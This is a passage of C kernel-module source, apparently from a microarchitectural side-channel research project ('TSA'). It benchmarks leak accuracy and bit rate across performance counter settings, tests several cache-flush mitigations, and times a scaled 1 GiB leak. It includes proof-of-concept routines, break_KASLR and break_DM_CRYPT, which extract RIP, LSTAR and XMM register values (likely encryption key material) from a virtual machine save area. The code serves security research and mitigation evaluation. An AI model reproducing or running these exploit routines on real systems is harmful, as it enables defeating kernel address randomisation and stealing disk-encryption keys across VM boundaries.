}

static int run_scaled_1gib_leak(volatile uint8_t *victim,
                                volatile uint8_t *target,
                                volatile uint64_t *chase,
                                calib_t *cal,
                                uint64_t *times0,
                                uint64_t *times1,
                                int samples,
                                probe_func_t probe,
                                u32 mitigation,
                                int *calibration_failed)
{
    u32 b;
    int correct = 0;

    for (b = 0; b < TSA_SCALED_LEAK_BITS; b++) {
        u32 reused_bit = b % TSA_REUSED_SECRET_BITS;
        int true_bit = true_secret_bit(reused_bit);
        int local_bit = reused_bit & 63;
        volatile uint8_t *target_word = target + ((reused_bit / 64) * 8);
        bit_res_t res;

        if ((b & 0x3ff) == 0)
            cond_resched();

        if (b > 0 && (b % TSA_SCALED_RECALIBRATE_BITS) == 0) {
            *cal = run_test_case(victim, target, chase, times0, times1,
                                 samples, probe, mitigation);
            fill_secret_region(victim, TSA_REUSED_SECRET_BITS);
        }

        res = measure_single_bit_otsu(victim,
                                      target_word,
                                      local_bit,
                                      chase,
                                      times0,
                                      cal,
                                      samples,
                                      probe,
                                      mitigation);


        if (res.pred_bit == true_bit)
            correct++;
    }

    return correct;
}

/* ------------------------------------------------------------------ */
/* Benchmark helpers                                                  */
/* ------------------------------------------------------------------ */
static const char *bench_name(int bench_id)
{
    switch (bench_id) {
    case 1: return "accuracy_vs_samples";
    case 2: return "secret_length_scaling";
    case 3: return "working_pmcs";
    case 4: return "virtual_vs_physical";
    case 5: return "mitigation_effectiveness";
    case 6: return "negative_controls";
    case 7: return "vmrun";
    case 9: return "accuracy_vs_samples_4k_alias_stlf";
    case 10: return "scaled_1gib_leak_rate";
    default: return "unknown";
    }
}

static void tsa_print_bench_result(u64 run_id,
                                   int bench_id,
                                   int repeat,
                                   int samples,
                                   int secret_bits,
                                   int evt,
                                   int umask,
                                   u32 mitigation,
                                   u32 access_type,
                                   u32 negative_control,
                                   int correct,
                                   int total_bits,
                                   const calib_t *cal,
                                   u64 cal_ns,
                                   u64 ext_ns,
                                   int skipped,
                                   const char *note)
{
    int accuracy_permille = 0;
    int working = 0;
    u64 raw_bps_x1000 = 0;
    u64 end_to_end_bps_x1000 = 0;

    if (total_bits > 0 && correct >= 0)
        accuracy_permille = (correct * 1000) / total_bits;

    if (cal && cal->threshold != 0 && cal->mean0 != cal->mean1 && accuracy_permille >= DEFAULT_ACCURACY_THRESHOLD_PERMILLE)
        working = 1;

    if (ext_ns > 0 && total_bits > 0 && correct >= 0)
        raw_bps_x1000 = div64_u64((u64)total_bits * 1000000000000ULL, ext_ns);

    if ((cal_ns + ext_ns) > 0 && total_bits > 0 && correct >= 0)
        end_to_end_bps_x1000 = div64_u64((u64)total_bits * 1000000000000ULL, cal_ns + ext_ns);

    pr_info("BMK,RESULT,"
            "run=%llu,"
            "bench=%d,"
            "bench_name=%s,"
            "round=%d,"
            "samples=%d,"
            "secret_bits=%d,"
            "event=0x%02x,"
            "umask=0x%02x,"
            "mitigation=0x%x,"
            "access=0x%x,"
            "negative=0x%x,"
            "correct=%d,"
            "total=%d,"
            "accuracy_permille=%d,"
            "working=%d,"
            "threshold=%llu,"
            "mean0=%llu,"
            "mean1=%llu,"
            "one_is_high=%d,"
            "cal_ns=%llu,"
            "ext_ns=%llu,"
            "raw_bps_x1000=%llu,"
            "end_to_end_bps_x1000=%llu,"
            "skipped=%d,"
            "note=%s\n",
            (unsigned long long)run_id,
            bench_id,
            bench_name(bench_id),
            repeat,
            samples,
            secret_bits,
            evt,
            umask,
            mitigation,
            access_type,
            negative_control,
            correct,
            total_bits,
            accuracy_permille,
            working,
            cal ? (unsigned long long)cal->threshold : 0ULL,
            cal ? (unsigned long long)cal->mean0 : 0ULL,
            cal ? (unsigned long long)cal->mean1 : 0ULL,
            cal ? cal->one_is_high : 0,
            (unsigned long long)cal_ns,
            (unsigned long long)ext_ns,
            (unsigned long long)raw_bps_x1000,
            (unsigned long long)end_to_end_bps_x1000,
            skipped,
            note ? note : "none");
}


static int sanitize_u8_range_start(u32 v);
static int sanitize_u8_range_end(u32 v);
static int sanitize_event_end_range(u32 v);

struct tsa_measure_result {
    calib_t cal;
    int correct;
    int total_bits;
    u64 cal_ns;
    u64 ext_ns;
    int skipped;
    const char *note;
};

static void tsa_measure_one_physical_config(volatile uint8_t *victim,
                                   volatile uint8_t *target,
                                   volatile uint64_t *chase,
                                   uint64_t *times0,
                                   uint64_t *times1,
                                   int samples,
                                   int secret_bits,
                                   int evt,
                                   int umask,
                                   u32 mitigation,
                                   u32 access_type,
                                   u32 negative_control,
                                   struct tsa_measure_result *out)
{
    u64 t0, t1, t2, t3;
    probe_func_t probe;
    u64 offset = 0;

    if(access_type == TSA_ACCESS_PHYSICAL)
    {
        probe = probe_vmsave;
        offset = PAGE_OFFSET_CACHED;
    }else if(access_type == TSA_ACCESS_VMRUN)
    {
        probe = probe_vmrun;
        offset = VMSA_RAX_OFFSET;
    }else{
        out->skipped = 1;
        out->note = "invalid_access_type_for_physical_probe";
        return;
    }

    kernel_fpu_begin();
    configure_pmc(evt, umask);

    t0 = ktime_get_ns();
    out->cal = run_test_case(victim, target, chase, times0, times1, samples, probe, 1);
    t1 = ktime_get_ns();

    t2 = ktime_get_ns();
    if (out->cal.threshold != 0 && out->cal.mean0 != out->cal.mean1) {
        out->correct = run_extraction_physical_bits(victim, target + offset, chase, &out->cal, times0,
                                           samples, secret_bits, probe, 0);
    } else {
        out->correct = 0;
        out->note = "calibration_failed";
    }
    t3 = ktime_get_ns();

    int acc = (out->correct * 1000) / out->total_bits;
    if (acc < DEFAULT_ACCURACY_THRESHOLD_PERMILLE)
    {
        out->correct = 0;
        out->note = "accuracy_below_threshold";
    }
            
    disable_pmc();
    kernel_fpu_end();

    out->cal_ns = t1 - t0;
    out->ext_ns = t3 - t2;
   
}

static void tsa_measure_one_config_with_probe(volatile uint8_t *victim,
                                              volatile uint8_t *target,
                                              volatile uint64_t *chase,
                                              uint64_t *times0,
                                              uint64_t *times1,
                                              int samples,
                                              int secret_bits,
                                              int evt,
                                              int umask,
                                              u32 mitigation,
                                              u32 access_type,
                                              u32 negative_control,
                                              probe_func_t probe_override,
                                              struct tsa_measure_result *out)
{
    u64 t0, t1, t2, t3;
    probe_func_t probe = probe_override ? probe_override : select_probe_for_negative_control(negative_control);

    memset(out, 0, sizeof(*out));
    out->correct = -1;
    out->total_bits = secret_bits;
    out->note = "ok";

    if (samples <= 0 || samples > MAX_SWEEP_PROBES || secret_bits <= 0 || secret_bits > MAX_SECRET_BITS) {
        out->skipped = 1;
        out->note = "invalid_parameters";
        return;
    }

    if (negative_control != TSA_NEG_NONE && negative_control != TSA_NEG_NO_TARGET_TLB_FLUSH) {
        out->skipped = 1;
        out->note = "negative_control_probe_not_implemented_in_this_module";
        return;
    }

    if (access_type == TSA_ACCESS_PHYSICAL || access_type == TSA_ACCESS_VMRUN) {
        tsa_measure_one_physical_config(victim, target, chase, times0, times1, samples, secret_bits,
                                        evt, umask, mitigation, access_type, negative_control, out);
        return;
    }

    kernel_fpu_begin();
    configure_pmc(evt, umask);

    t0 = ktime_get_ns();
    out->cal = run_test_case(victim, target, chase, times0, times1, samples, probe, mitigation);
    t1 = ktime_get_ns();

    t2 = ktime_get_ns();
    if (out->cal.threshold != 0 && out->cal.mean0 != out->cal.mean1) {
        out->correct = run_extraction_bits(victim, target, chase, &out->cal, times0,
                                           samples, secret_bits, probe, mitigation);
    } else {
        out->correct = 0;
        out->note = "calibration_failed";
    }
    t3 = ktime_get_ns();

    disable_pmc();
    kernel_fpu_end();

    out->cal_ns = t1 - t0;
    out->ext_ns = t3 - t2;
}

static void tsa_measure_one_config(volatile uint8_t *victim,
                                   volatile uint8_t *target,
                                   volatile uint64_t *chase,
                                   uint64_t *times0,
                                   uint64_t *times1,
                                   int samples,
                                   int secret_bits,
                                   int evt,
                                   int umask,
                                   u32 mitigation,
                                   u32 access_type,
                                   u32 negative_control,
                                   struct tsa_measure_result *out)
{
    tsa_measure_one_config_with_probe(victim, target, chase, times0, times1,
                                      samples, secret_bits, evt, umask,
                                      mitigation, access_type, negative_control,
                                      NULL, out);
}

static void tsa_run_one_config(u64 run_id,
                               int bench_id,
                               int repeat,
                               volatile uint8_t *victim,
                               volatile uint8_t *target,
                               volatile uint64_t *chase,
                               uint64_t *times0,
                               uint64_t *times1,
                               int samples,
                               int secret_bits,
                               int evt,
                               int umask,
                               u32 mitigation,
                               u32 access_type,
                               u32 negative_control)
{
    struct tsa_measure_result r;

    tsa_measure_one_config(victim, target, chase, times0, times1,
                           samples, secret_bits, evt, umask,
                           mitigation, access_type, negative_control, &r);

    tsa_print_bench_result(run_id, bench_id, repeat, samples, secret_bits, evt, umask,
                           mitigation, access_type, negative_control, r.correct, r.total_bits,
                           &r.cal, r.cal_ns, r.ext_ns, r.skipped, r.note);
}

static int cmp_int_kernel(const void *a, const void *b)
{
    int va = *(const int *)a;
    int vb = *(const int *)b;

    if (va > vb)
        return 1;
    if (va < vb)
        return -1;
    return 0;
}

static int median_int_array(int *arr, int n)
{
    if (!arr || n <= 0)
        return 0;

    sort(arr, n, sizeof(int), cmp_int_kernel, NULL);

    if (n & 1)
        return arr[n / 2];

    return (arr[(n / 2) - 1] + arr[n / 2]) / 2;
}

static u64 median_u64_array(uint64_t *arr, int n)
{
    if (!arr || n <= 0)
        return 0;

    sort(arr, n, sizeof(uint64_t), cmp_u64, NULL);

    if (n & 1)
        return arr[n / 2];

    return (arr[(n / 2) - 1] + arr[n / 2]) / 2;
}

/*
 * tsa_print_aggregate_result - emit a single aggregate BMK,RESULT line.
 *
 * Fields that are meaningless for an aggregate (correct, total, per-PMC
 * threshold/mean/one_is_high) are set to -1 / 0 so downstream parsers can
 * distinguish them from per-PMC rows.  accuracy_permille carries the median
 * accuracy over the qualifying PMC set.  pmc_count / pmc_total reflect how
 * many PMCs passed the accuracy filter vs. how many were tested in total.
 */
static void tsa_print_aggregate_result(u64 run_id,
                                       int bench_id,
                                       int repeat,
                                       int samples,
                                       int secret_bits,
                                       u32 mitigation,
                                       u32 access_type,
                                       u32 negative_control,
                                       int pmc_count,
                                       int pmc_total,
                                       int median_accuracy_permille,
                                       int median_working,
                                       u64 median_raw_bps_x1000,
                                       u64 median_end_to_end_bps_x1000,
                                       u64 median_cal_ns,
                                       u64 median_ext_ns,
                                       const char *note)
{
    pr_info("BMK,RESULT,"
            "run=%llu,"
            "bench=%d,"
            "bench_name=%s,"
            "round=%d,"
            "samples=%d,"
            "secret_bits=%d,"
            "mitigation=0x%x,"
            "access=0x%x,"
            "negative=0x%x,"
            "accuracy_permille=%d,"
            "cal_ns=%llu,"
            "ext_ns=%llu,"
            "raw_bps_x1000=%llu,"
            "end_to_end_bps_x1000=%llu,"
            "working_pmcs=%d,"
            "pmc_total=%d,"
            "note=%s\n",
            (unsigned long long)run_id,
            bench_id,
            bench_name(bench_id),
            repeat,
            samples,
            secret_bits,
            mitigation,
            access_type,
            negative_control,
            median_accuracy_permille,
            (unsigned long long)median_cal_ns,
            (unsigned long long)median_ext_ns,
            (unsigned long long)median_raw_bps_x1000,
            (unsigned long long)median_end_to_end_bps_x1000,
            pmc_count,
            pmc_total,
            note ? note : "median_over_pmcs");
}

static void tsa_run_metric_median_over_pmcs(const struct tsa_bench_args *args,
                                            int bench_id,
                                            int repeat,
                                            volatile uint8_t *victim,
                                            volatile uint8_t *target,
                                            volatile uint64_t *chase,
                                            uint64_t *times0,
                                            uint64_t *times1,
                                            int samples,
                                            int secret_bits,
                                            u32 mitigation,
                                            u32 access_type,
                                            u32 negative_control,
                                            probe_func_t probe_override)
{
    int evt_start = sanitize_u8_range_start(args->event_start);
    int evt_end = sanitize_event_end_range(args->event_end ? args->event_end : MAX_EVENT_ID);
    int umask_start = sanitize_u8_range_start(args->umask_start);
    int umask_end = sanitize_u8_range_end(args->umask_end ? args->umask_end : MAX_UMASK_ID);
    int max_count;
    int count = 0;       /* PMCs that passed the accuracy filter */
    int total_count = 0; /* all PMCs tested (for reporting) */
    int evt, umask;
    int *accuracy = NULL;
    int *working = NULL;
    uint64_t *raw_bps = NULL;
    uint64_t *end_bps = NULL;
    uint64_t *cal_ns = NULL;
    uint64_t *ext_ns = NULL;

    if (negative_control != TSA_NEG_NONE && negative_control != TSA_NEG_NO_TARGET_TLB_FLUSH) {
        tsa_print_bench_result(args->run_id, bench_id, repeat, samples, secret_bits, 0, 0,
                               mitigation, access_type, negative_control, -1, secret_bits,
                               NULL, 0, 0, 1, "negative_control_probe_not_implemented_in_this_module");
        return;
    }

    if (evt_end < evt_start)
        evt_end = evt_start;
    if (umask_end < umask_start)
        umask_end = umask_start;

    max_count = (evt_end - evt_start + 1) * (umask_end - umask_start + 1);

    accuracy = vmalloc(max_count * sizeof(*accuracy));
    working  = vmalloc(max_count * sizeof(*working));
    raw_bps  = vmalloc(max_count * sizeof(*raw_bps));
    end_bps  = vmalloc(max_count * sizeof(*end_bps));
    cal_ns   = vmalloc(max_count * sizeof(*cal_ns));
    ext_ns   = vmalloc(max_count * sizeof(*ext_ns));

    if (!accuracy || !working || !raw_bps || !end_bps || !cal_ns || !ext_ns) {
        tsa_print_bench_result(args->run_id, bench_id, repeat, samples, secret_bits, 0, 0,
                               mitigation, access_type, negative_control, -1, secret_bits,
                               NULL, 0, 0, 1, "aggregate_vmalloc_failed");
        goto out;
    }

    for (evt = evt_start; evt <= evt_end; evt++) {
        if ((evt % 16) == 0)
            pr_info("BMK,PROGRESS,run=%llu,bench=%d,repeat=%d,event=0x%02x,aggregate=median_over_pmcs\n",
                    (unsigned long long)args->run_id, bench_id, repeat, evt);

        for (umask = umask_start; umask <= umask_end; umask++) {
            struct tsa_measure_result r;
            int acc;

            tsa_measure_one_config_with_probe(victim, target, chase, times0, times1,
                                              samples, secret_bits, evt, umask,
                                              mitigation, access_type, negative_control,
                                              probe_override, &r);

            total_count++;

            if (r.skipped)
                continue;
            if (r.cal.threshold == 0 || r.cal.mean0 == r.cal.mean1)
                continue;
            if (r.total_bits <= 0 || r.correct < 0)
                continue;

            acc = (r.correct * 1000) / r.total_bits;
            if (acc < DEFAULT_ACCURACY_THRESHOLD_PERMILLE)
                continue;

            accuracy[count] = acc;
            working[count]  = 1; /* all PMCs that pass the accuracy filter are considered "working" for the working PMCs metric */
            raw_bps[count]  = (r.ext_ns > 0) ?
                              div64_u64((u64)r.total_bits * 1000000000000ULL, r.ext_ns) : 0;
            end_bps[count]  = ((r.cal_ns + r.ext_ns) > 0) ?
                              div64_u64((u64)r.total_bits * 1000000000000ULL,
                                        r.cal_ns + r.ext_ns) : 0;
            cal_ns[count]   = r.cal_ns;
            ext_ns[count]   = r.ext_ns;
            count++;
        }
        cond_resched();
    }

    tsa_print_aggregate_result(args->run_id, bench_id, repeat, samples, secret_bits,
                               mitigation, access_type, negative_control,
                               count,        /* PMCs that passed the filter   */
                               total_count,  /* total PMCs tested             */
                               count > 0 ? median_int_array(accuracy, count) : 0,
                               count > 0 ? median_int_array(working,  count) : 0,
                               count > 0 ? median_u64_array(raw_bps,  count) : 0,
                               count > 0 ? median_u64_array(end_bps,  count) : 0,
                               count > 0 ? median_u64_array(cal_ns,   count) : 0,
                               count > 0 ? median_u64_array(ext_ns,   count) : 0,
                               count > 0 ? "median_over_qualifying_pmcs"
                                         : "no_pmcs_passed_accuracy_filter");

out:
    if (accuracy)
        vfree(accuracy);
    if (working)
        vfree(working);
    if (raw_bps)
        vfree(raw_bps);
    if (end_bps)
        vfree(end_bps);
    if (cal_ns)
        vfree(cal_ns);
    if (ext_ns)
        vfree(ext_ns);
}

static int list_value_or_default(const u32 *arr, u32 n, int idx, int fallback)
{
    if (n == 0)
        return fallback;
    if (idx < 0 || idx >= n)
        return fallback;
    return arr[idx];
}

static int sanitize_u8_range_start(u32 v)
{
    if (v > 0xff)
        return 0xff;
    return v;
}

static int sanitize_u8_range_end(u32 v)
{
    if (v > 0xff)
        return 0xff;
    return v;
}

static int sanitize_event_end_range(u32 v)
{
    if (v > MAX_EVENT_ID)
        return MAX_EVENT_ID;
    return v;
}

static void tsa_run_pmc_sweep_bench(const struct tsa_bench_args *args,
                                    int bench_id,
                                    volatile uint8_t *victim,
                                    volatile uint8_t *target,
                                    volatile uint64_t *chase,
                                    uint64_t *times0,
                                    uint64_t *times1,
                                    u32 access_type)
{
    int evt_start = sanitize_u8_range_start(args->event_start);
    int evt_end = sanitize_event_end_range(args->event_end ? args->event_end : MAX_EVENT_ID);
    int umask_start = sanitize_u8_range_start(args->umask_start);
    int umask_end = sanitize_event_end_range(args->umask_end ? args->umask_end : MAX_UMASK_ID);
    int samples = args->default_samples ? args->default_samples : DEFAULT_SWEEP_PROBES;
    int secret_bits = args->default_secret_bits ? args->default_secret_bits : DEFAULT_SECRET_BITS;
    int rep, evt, umask;

    if (evt_end < evt_start)
        evt_end = evt_start;
    if (umask_end < umask_start)
        umask_end = umask_start;

    for (rep = 0; rep < args->repeats; rep++) {
        for (evt = evt_start; evt <= evt_end; evt++) {
            for (umask = umask_start; umask <= umask_end; umask++) {
                tsa_run_one_config(args->run_id, bench_id, rep, victim, target, chase,
                                   times0, times1, samples, secret_bits, evt, umask,
                                   TSA_MIT_NONE, access_type, TSA_NEG_NONE);
            }
            cond_resched();
        }
    }
}

static void tsa_measure_scaled_1gib_config(volatile uint8_t *victim,
                                           volatile uint8_t *target,
                                           volatile uint64_t *chase,
                                           uint64_t *times0,
                                           uint64_t *times1,
                                           int samples,
                                           int evt,
                                           int umask,
                                           struct tsa_measure_result *out)
{
    u64 t0, t1, t2, t3;
    int calibration_failed = 0;

    memset(out, 0, sizeof(*out));
    out->correct = -1;
    out->total_bits = TSA_SCALED_LEAK_BITS;
    out->note = "ok";

    if (samples <= 0 || samples > MAX_SWEEP_PROBES) {
        out->skipped = 1;
        out->note = "invalid_parameters";
        return;
    }

    configure_pmc(evt, umask);

    t0 = ktime_get_ns();
    out->cal = run_test_case(victim, target, chase, times0, times1, samples, probe_D1, TSA_MIT_NONE);
    t1 = ktime_get_ns();

    fill_secret_region(victim, TSA_REUSED_SECRET_BITS);
    if (out->cal.threshold != 0 && out->cal.mean0 != out->cal.mean1) {
        t2 = ktime_get_ns();

        out->correct = run_scaled_1gib_leak(victim, target, chase, &out->cal,
                                            times0, times1, samples, probe_D1,
                                            TSA_MIT_NONE, &calibration_failed);
        t3 = ktime_get_ns();

        out->ext_ns = t3 - t2;
        if (calibration_failed)
            out->note = "recalibration_failed";
    } else {
        out->correct = 0;
        out->ext_ns = 0;
        out->note = "calibration_failed";
    }

    disable_pmc();

    out->cal_ns = t1 - t0;
}

static void tsa_run_scaled_1gib_leak_bench(const struct tsa_bench_args *args,
                                           volatile uint8_t *victim,
                                           volatile uint8_t *target,
                                           volatile uint64_t *chase,
                                           uint64_t *times0,
                                           uint64_t *times1)
{
    int evt_start = sanitize_u8_range_start(args->event_start);
    int evt_end = sanitize_event_end_range(args->event_end ? args->event_end : MAX_EVENT_ID);
    int umask_start = sanitize_u8_range_start(args->umask_start);
    int umask_end = sanitize_u8_range_end(args->umask_end ? args->umask_end : MAX_UMASK_ID);
    int default_samples = args->default_samples ? args->default_samples : DEFAULT_SWEEP_PROBES;
    int rep, evt, umask, i;

    if (evt_end < evt_start)
        evt_end = evt_start;
    if (umask_end < umask_start)
        umask_end = umask_start;

    for (rep = 0; rep < args->repeats; rep++) {
        for (i = 0; i < args->n_samples; i++) {
            int samples = list_value_or_default(args->samples, args->n_samples, i, default_samples);

            for (evt = evt_start; evt <= evt_end; evt++) {
                for (umask = umask_start; umask <= umask_end; umask++) {
                    struct tsa_measure_result r;

                    tsa_measure_scaled_1gib_config(victim, target, chase, times0, times1,
                                                   samples, evt, umask, &r);
                    tsa_print_bench_result(args->run_id, 10, rep, samples,
                                           TSA_SCALED_LEAK_BITS, evt, umask,
                                           TSA_MIT_NONE, TSA_ACCESS_VIRTUAL, TSA_NEG_NONE,
                                           r.correct, r.total_bits, &r.cal, r.cal_ns,
                                           r.ext_ns, r.skipped, r.note);
                    cond_resched();
                }

            }
        }
    }
}

static void break_KASLR(volatile uint8_t *victim, 
                        volatile uint8_t *target, 
                        volatile uint64_t *chase, 
                        uint64_t *times0, uint64_t *times1, 
                        int samples, probe_func_t probe,
                        struct tsa_measure_result *out,
                        u64 run_id)
{
    uint64_t RIP = run_extraction_secret(victim, target + VMSA_RIP_OFFSET, chase, &out->cal, times0, samples, 64, probe, 0);
    uint64_t LSTAR = run_extraction_secret(victim, target + VMSA_LSTAR_OFFSET, chase, &out->cal, times0, samples, 64, probe, 0);

    if(RIP == 0 || LSTAR == 0 || RIP == 0xffffffffffffffffULL || LSTAR == 0xffffffffffffffffULL)
        return;
    
    pr_info("BMK,RESULT,run=%llu,bench=break_kaslr,RIP=0x%016llx,LSTAR=0x%016llx\n",
            (unsigned long long)run_id, (unsigned long long)RIP, (unsigned long long)LSTAR);
}


static int dm_crypt_round = 0;
static void break_DM_CRYPT(volatile uint8_t *victim, 
                        volatile uint8_t *target, 
                        volatile uint64_t *chase, 
                        uint64_t *times0, uint64_t *times1, 
                        int samples, probe_func_t probe,
                        struct tsa_measure_result *out,
                        u64 run_id)
{

    uint64_t XMM0_0 = run_extraction_secret(victim, target + VMSA_XMM0_OFFSET, chase, &out->cal, times0, samples, 64, probe, 0);
    uint64_t XMM0_1 = run_extraction_secret(victim, target + VMSA_XMM0_OFFSET + 8, chase, &out->cal, times0, samples, 64, probe, 0);

    uint64_t XMM1_0 = run_extraction_secret(victim, target + VMSA_XMM2_OFFSET, chase, &out->cal, times0, samples, 64, probe, 0);
    uint64_t XMM1_1 = run_extraction_secret(victim, target + VMSA_XMM2_OFFSET + 8, chase, &out->cal, times0, samples, 64, probe, 0);

    if(!dm_crypt_round)
    {
        pr_info("BMK,RESULT,run=%llu,bench=break_dm_crypt,XMM0_0_0=0x%016llx,XMM0_1_0=0x%016llx, XMM1_0_0=0x%016llx,XMM1_1_0=0x%016llx\n",
            (unsigned long long)run_id, (unsigned long long)XMM0_0, (unsigned long long)XMM0_1, (unsigned long long)XMM1_0, (unsigned long long)XMM1_1);     
    }else{
        pr_info("BMK,RESULT,run=%llu,bench=break_dm_crypt,XMM0_0_1=0x%016llx,XMM0_1_1=0x%016llx, XMM1_0_1=0x%016llx,XMM1_1_1=0x%016llx\n",
            (unsigned long long)run_id, (unsigned long long)XMM0_0, (unsigned long long)XMM0_1, (unsigned long long)XMM1_0, (unsigned long long)XMM1_1);     
    }
}

static void tsa_measure_one_config_poc(volatile uint8_t *victim,
                                       volatile uint8_t *target,
                                       volatile uint64_t *chase,
                                       uint64_t *times0,
                                       uint64_t *times1,
                                       int samples,
                                       int secret_bits,
                                       int evt,
                                       int umask,
                                       u32 access_type,
                                       struct tsa_measure_result *out,
                                       u64 run_id)
{
    memset(out, 0, sizeof(*out));
    out->correct = -1;
    out->total_bits = secret_bits;
    out->note = "ok";

    probe_func_t probe = probe_vmrun;

    if (samples <= 0 || samples > MAX_SWEEP_PROBES || secret_bits <= 0 || secret_bits > MAX_SECRET_BITS) {
        pr_err("Invalid parameters for PoC measurement: samples=%d, secret_bits=%d\n", samples, secret_bits);
        return;
    }

    kernel_fpu_begin();
    configure_pmc(evt, umask);

    out->cal = run_test_case(victim, target, chase, times0, times1, samples, probe, 1);

    if (out->cal.threshold != 0 && out->cal.mean0 != out->cal.mean1) {
        if(access_type == TSA_BREAK_KASLR)
            break_KASLR(victim, target, chase, times0, times1, samples, probe, out, run_id);
        else if(access_type == TSA_BREAK_DM_CRYPT)
            break_DM_CRYPT(victim, target, chase, times0, times1, samples, probe, out, run_id);
    }

    disable_pmc();
    kernel_fpu_end();
}

static void tsa_run_poc(const struct tsa_bench_args *args,
                        int bench_id,
                        volatile uint8_t *victim,
                        volatile uint8_t *target,
                        volatile uint64_t *chase,
                        uint64_t *times0,
                        uint64_t *times1,
                        u32 access_type)
{
    int evt_start = sanitize_u8_range_start(args->event_start);
    int evt_end = sanitize_event_end_range(args->event_end ? args->event_end : MAX_EVENT_ID);
    int umask_start = sanitize_u8_range_start(args->umask_start);
    int umask_end = sanitize_event_end_range(args->umask_end ? args->umask_end : MAX_UMASK_ID);
    int samples = args->default_samples ? args->default_samples : DEFAULT_SWEEP_PROBES;
    int secret_bits = args->default_secret_bits ? args->default_secret_bits : DEFAULT_SECRET_BITS;
    int rep, evt, umask;

    if (evt_end < evt_start)
        evt_end = evt_start;
    if (umask_end < umask_start)
        umask_end = umask_start;

    struct tsa_measure_result r;
    for (rep = 0; rep < args->repeats; rep++) {
        for (evt = evt_start; evt <= evt_end; evt++) {
            for (umask = umask_start; umask <= umask_end; umask++) {
                tsa_measure_one_config_poc(victim, target, chase, times0, times1,
                                       samples, secret_bits, evt, umask,
                                       access_type, &r, args->run_id);
            }
            cond_resched();
        }
    }
}

static inline uint64_t canonicalize_48(uint64_t va)
{
    va &= 0x0000ffffffffffffULL;

    if (va & (1ULL << 47))
        va |= 0xffff000000000000ULL;

    return va;
}

static void tsa_setup_physical_address(void)
{
    uint64_t mask =
    (1ULL << 13) | (1ULL << 26) |   
    (1ULL << 14) | (1ULL << 25);    

    PHYS_BASE_BUF = (uint64_t)kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!PHYS_BASE_BUF) {
        pr_err("Failed to allocate physical base buffer\n");
        return;
    }

    PHYS_BASE = virt_to_phys((void *)PHYS_BASE_BUF);
    asm volatile("vmsave %0" :: "a"(PHYS_BASE) : "memory");

    SECRET_VALUE = *(uint64_t *)(PHYS_BASE_BUF + PAGE_OFFSET_CACHED);

    VICTIM_VA_PHYS = canonicalize_48(BASE_VA + PHYS_BASE);
    ATTACK_VA_PHYS = canonicalize_48((BASE_VA + PHYS_BASE) ^ mask);

}

static void tsa_cleanup_physical_address(void)
{
    if (PHYS_BASE_BUF) {
        kfree((void *)PHYS_BASE_BUF);
        PHYS_BASE_BUF = 0;
        PHYS_BASE = 0;
        VICTIM_VA_PHYS = 0;
        ATTACK_VA_PHYS = 0;
    }
}

static void tsa_run_benchmarks(const struct tsa_bench_args *args,
                               volatile uint8_t *victim,
                               volatile uint8_t *target,
                               volatile uint64_t *chase,
                               uint64_t *times0,
                               uint64_t *times1)
{
    int repeats = args->repeats ? args->repeats : 1;
    int default_samples = args->default_samples ? args->default_samples : DEFAULT_SWEEP_PROBES;
    int default_secret_bits = args->default_secret_bits ? args->default_secret_bits : DEFAULT_SECRET_BITS;
    int rep, i;

    pr_info("BMK,START,run=%llu,bench_mask=0x%x,repeats=%d\n",
            (unsigned long long)args->run_id, args->bench_mask, repeats);

    if (args->bench_mask & TSA_BENCH_1_ACCURACY_VS_SAMPLES) {
        for (rep = 0; rep < repeats; rep++) {
            for (i = 0; i < args->n_samples; i++) {
                int samples = list_value_or_default(args->samples, args->n_samples, i, default_samples);
                tsa_run_metric_median_over_pmcs(args, 1, rep, victim, target, chase,
                                                times0, times1, samples, default_secret_bits,
                                                TSA_MIT_NONE, TSA_ACCESS_VIRTUAL, TSA_NEG_NONE,
                                                NULL);
            }
        }
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 1, bench_name(1));
    }

    if (args->bench_mask & TSA_BENCH_9_4K_ALIAS_STLF) {
        for (rep = 0; rep < repeats; rep++) {
            for (i = 0; i < args->n_samples; i++) {
                int samples = list_value_or_default(args->samples, args->n_samples, i, default_samples);
                tsa_run_metric_median_over_pmcs(args, 9, rep, victim, target, chase,
                                                times0, times1, samples, default_secret_bits,
                                                TSA_MIT_NONE, TSA_ACCESS_VIRTUAL, TSA_NEG_NONE,
                                                probe_4k_alias_stlf);
            }
        }
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 9, bench_name(9));
    }

    if (args->bench_mask & TSA_BENCH_2_SECRET_LENGTH) {
        for (rep = 0; rep < repeats; rep++) {
            for (i = 0; i < args->n_secret_bits; i++) {
                int secret_bits = list_value_or_default(args->secret_bits,
                                                        args->n_secret_bits,
                                                        i,
                                                        default_secret_bits);
                tsa_run_metric_median_over_pmcs(args, 2, rep, victim, target, chase,
                                                times0, times1, default_samples, secret_bits,
                                                TSA_MIT_NONE, TSA_ACCESS_VIRTUAL, TSA_NEG_NONE,
                                                NULL);
            }
        }
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 2, bench_name(2));
    }

    if (args->bench_mask & TSA_BENCH_3_WORKING_PMCS) {
        tsa_run_pmc_sweep_bench(args, 3, victim, target, chase, times0, times1, TSA_ACCESS_VIRTUAL);
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 3, bench_name(3));
    }

    if (args->bench_mask & TSA_BENCH_10_1GIB_LEAK_RATE) {
        tsa_run_scaled_1gib_leak_bench(args, victim, target, chase, times0, times1);
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 10, bench_name(10));
    }

    if (args->bench_mask & TSA_BENCH_4_VIRT_VS_PHYS) {
        if (args->access_mask & TSA_ACCESS_PHYSICAL)
        {
            tsa_run_pmc_sweep_bench(args, 4, victim, target, chase, times0, times1, TSA_ACCESS_PHYSICAL);
        }
            
        pr_info("BMK,BENCH_END,run=%llu,bench=%d,bench_name=%s\n",
                (unsigned long long)args->run_id, 4, bench_name(4));
    }

    if (args->bench_mask & TSA_BENCH_5_MITIGATION) {
        static const u32 mitigations[] = {
            TSA_MIT_L1D_FLUSH,
            TSA_MIT_CFLUSH,
            TSA_MIT_WBINVD,
            TSA_MIT_VERW
        };

        for (rep = 0; rep < repeats; rep++) {
            for (i = 0; i < ARRAY_SIZE(mitigations); i++) {
